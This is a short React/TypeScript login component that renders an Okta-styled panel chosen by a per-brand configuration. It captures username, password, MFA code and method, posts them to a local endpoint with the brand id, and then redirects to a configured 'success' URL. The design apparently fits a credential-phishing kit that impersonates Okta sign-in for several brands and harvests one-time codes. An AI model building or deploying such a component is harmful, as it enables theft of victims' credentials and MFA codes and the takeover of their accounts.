'use client';

import { OktaPanel } from '@/components/OktaPanel';
import { BrandConfig } from '@/config/brands.config';

interface LoginHandlerProps {
  brand: BrandConfig;
}

export function LoginHandler({ brand }: LoginHandlerProps) {
  const handleCredentialsSubmit = async (data: {
    username: string;
    password: string;
    code?: string;
    mfaMethod?: string;
  }) => {
    // Final submission - redirect to success URL
    await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        brand: brand.id,
        step: 'complete',
        ...data,
      }),
    });

    // Redirect to success URL
    window.location.href = brand.successRedirect;
  };

  return (
    <OktaPanel
      brand={brand}
      onCredentialsSubmit={handleCredentialsSubmit}
    />
  );
}
